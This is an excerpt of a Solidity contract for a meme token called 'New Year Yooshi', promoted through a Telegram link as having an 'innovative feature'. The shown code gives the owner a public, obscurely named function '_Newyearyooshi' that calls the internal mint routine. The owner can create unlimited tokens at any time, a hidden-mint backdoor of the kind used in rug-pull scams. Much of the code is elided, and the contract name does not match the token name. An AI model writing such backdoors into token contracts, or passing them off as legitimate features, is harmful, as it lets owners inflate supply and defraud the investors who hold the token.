...
//
// $NewYearYooshi proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/NewYearYooshi
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Newyearyooshi(uint256 amount) public onlyOwner {
 _Newyearyooshi(msg.sender, amount);
    }
    ...
    function _Newyearyooshi(address account, uint256 amount) internal virtual {
...
contract $NewYearChikuInu is ERC20 {
    ...
    constructor() public ERC20("New Year Yooshi", "NEWYEARYOOSHI") {
        _Newyearyooshi(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}